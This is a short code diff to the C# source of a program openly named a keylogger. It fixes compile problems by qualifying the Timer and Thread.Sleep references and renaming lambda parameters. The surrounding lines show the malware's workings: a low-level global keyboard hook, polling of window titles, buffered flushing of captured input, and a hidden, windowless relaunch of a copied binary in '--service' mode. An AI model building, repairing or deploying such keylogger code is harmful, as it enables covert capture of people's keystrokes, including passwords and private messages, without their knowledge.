@@ -13,7 +13,6 @@ using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
-using System.Threading;
 using System.Windows.Forms;
 using Microsoft.Win32;
 
@@ -95,11 +94,11 @@ namespace KeyLogger.Service
                     _hookId = SetWindowsHookEx(WH_KEYBOARD_LL, _keyboardProc,
                         GetModuleHandle(m.ModuleName), 0);
 
-                var timer = new Timer { Interval = WINDOW_POLL_MS };
-                timer.Tick += (_, _) => { PollWindowTitle(); FlushIfIdle(); };
+                var timer = new System.Windows.Forms.Timer { Interval = WINDOW_POLL_MS };
+                timer.Tick += (s, args) => { PollWindowTitle(); FlushIfIdle(); };
                 timer.Start();
             };
-            form.FormClosing += (_, _) =>
+            form.FormClosing += (s, args) =>
             {
                 if (_hookId != IntPtr.Zero) UnhookWindowsHookEx(_hookId);
             };
@@ -122,7 +121,7 @@ namespace KeyLogger.Service
                     FileName = dst, Arguments = "--service",
                     WindowStyle = ProcessWindowStyle.Hidden,
                     CreateNoWindow = true, UseShellExecute = false,
-                })) { Thread.Sleep(200); }
+                })) { System.Threading.Thread.Sleep(200); }
             }
             catch { }
             Environment.Exit(0);
